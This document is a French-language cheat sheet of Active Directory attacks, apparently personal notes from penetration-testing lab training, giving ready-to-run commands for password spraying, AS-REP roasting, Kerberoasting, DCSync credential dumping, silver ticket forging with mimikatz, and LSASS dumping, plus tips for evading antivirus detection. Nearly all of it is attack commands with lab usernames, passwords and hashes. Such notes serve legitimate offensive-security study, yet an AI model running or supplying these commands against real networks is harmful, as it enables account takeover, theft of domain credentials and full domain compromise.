# Attaque de mot de passe
net accounts politiques de mot de passe
Tester creds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString = "LDAP://" + $PDC + "/" + $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Spray
### Linux
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#Utile pour savoir si
netexec smb 192.168.213.75 -u user.txt -p 'Nexus123!' -d corp.com --continue-on-success
#on peut ajouter une plage d'IP
netexec smb 192.168.213.75/24 -u pete -p "Nexus123!" -d corp.com --continue-on-success
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
```shell-session
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
### Windows
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

### [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
Peut générer une liste d'usagers si machine relié au domaine.
```powershell-session
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
`-UserList` spécifier une liste d'usager

## Obtenir un TGT
Requière un nom et mot de passe
utiliser kinit

# AS-REP Roasting
Permet d'obtenir le hash d'un mot de passe par un TGT avec seulement un AS-REP du controlleur de domaine.
Doit avoir:
*  un compte
   * Le compte doit avoir Do not require Kerberos preauthentication actif
*  connaître le nom de domaine

## Linux
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#Extraire le AS-REP, cherche tous les usagés sans preauth après s'être connecté
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete:Flowers1
#Extraire le AS-REP si on a une liste sans être connecté
impacket-GetNPUsers jab.htb/ -dc-ip <ipaddress> -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
#crack le TGT
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Windows
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
#pas grand choses à fournir si on est déjà authentifié
.\Rubeus.exe asreproast /nowrap /format:hashcat
#ensuite copier le hash et cracker sur linux
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## détection des usagers sans preauthentification
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
#powerview
Get-DomainUser -PreauthNotRequired
#linux
impacket-GetNPUsers -dc-ip 192.168.213.70 corp.com/pete
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Si il n'y a pas d'usager sans preauth, mais que nous avons GenericWrite ou GenericAll sur un autre compte, on peut modifier cette valeur.

# Kerberoasting
Demande d'un ticket de service, décrypté d'une quelquonque façon, on obtient le hash du mot de passe du Service Principal Name (SPN)

### Windows
``` powershell
#énumération
setspn.exe -Q */*
#Extraire TGS-REP. Si authentifié, identifie automatiquement les SPN
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /nowrap /user:testspn
#utiliser /domain:<nom> pour abuser des trusts
/tgtdeleg #force encryption RC4
```
#### semi-manuel
``` powershell
#ajouter les classes .net
Add-Type -AssemblyName System.IdentityModel
#requête TGS et charge dans la session
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
#lancer mimikatz et exporter le ticket en base64 sinon cela crée un .kirbi.kirbi
base64 /out:true
kerberos::list /export
#décrypter
echo "<base64 blob>" |  tr -d \\n | base64 -d > tgs.kirbi
kirby2john tgs.kirbi
# Peut-être pas besoin de ça???
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
#### powerview
```powershell-session
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
### Linux
``` shell
##Lister les SPN
impacket-GetUserSPNs -dc-ip 192.168.50.70 corp.com/pete
impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
-request #Extrait les TGS pour tous les services
-request-user <SPN> #TGS pour un service
-outputfile <Fichier>
-target-domain <domain> #Pour attaquer à travers les domaines.
```

| *Hashcat mode* | *Encryption Name* | *KRB tag*|
| --- | --- | --- |
| 13100 | RC4 | `$23$` |
| 19600 | AES-128 | `$17$` |
| 19700 | AES-256 | `$18$` |

Efficace si le service roule sous un compte de service. Si le SPN roule dans le contexte d'un compte d'ordinateur, un compte de service géré ou un compte de service de groupe géré le mot de passe sera aléatoire et pratiquement incraquable.
Si on a GenericWrite ou GenericAll persmissions sur un compte, on peut mettre un SPN dessus, faire une requête pour extraire le hash. Plus furtif que changer le mot de passe.

# Synchronization de controlleur de domaines
Directory Replication Service (DRS) remote protocol utilise la réplication pour synchroniser les divers contolleurs de domaine. Contolleur de domaine peut demander mise à jour pour objet avec API IDL_DRSGetNCChanges
Vérifie seulement si le SID a les bons privilièges. (Replicating Directory Changes, Replicating Directory Changes All,and Replicating Directory Changes in Filtered ) Par défaut: 
* Domain admins
* Enterprise admins
* administrators
## Mimikatz
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:beyond\Administrator
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## impacket-secretsdump
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023!"@192.168.250.70
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Silver Tickets
Forger son propre ticket de service
le ticket n'est pas vérifié par l'application
Privileged Account Certificate (PAC) validation force le service à vérifier l'utilisateur. Ce n'est pas actif par défaut.
Le service détermine les droits selon ce qui se trouve dans le ticket
Si le SPN est utilisé sur plusieurs services, alors ce ticket argent peut être utilser sur les autres.

Doit avoir:
* SPN password ou hash 
   * peut-être mimikatz si admin local et service loggé localement
* Domain SID
   * whoami /user (**S-1-5-21-1987370270-658905905-1781884369**-1105)
* Target SPN
	* ex: HTTP/web04.corp.com:80
	
Avec mimikatz:
user jeffadmin parcequ'on peut, pourrait être n'importe qui
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
**klist** pour confirmer nos tickets
On peut maintenant accéder à la page de WEB04

# Mimikatz
Peut exporter des tickets (TGT ou TGS) sur le disque dur ou vers le processus LSASS
sekurlsa::tickets
sekurlsa::logonpasswords
Mimikatz est facilement détecté. utiliser des techniques d'évitement d'antivirus comme injecter directement en mémoire avec powershell, ou utiliser Task Manager pour extraire la mémoire du processus LSASS pour l'analyser sur une autre machine.
https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/
https://fuzzysecurity.com/tutorials/18.html
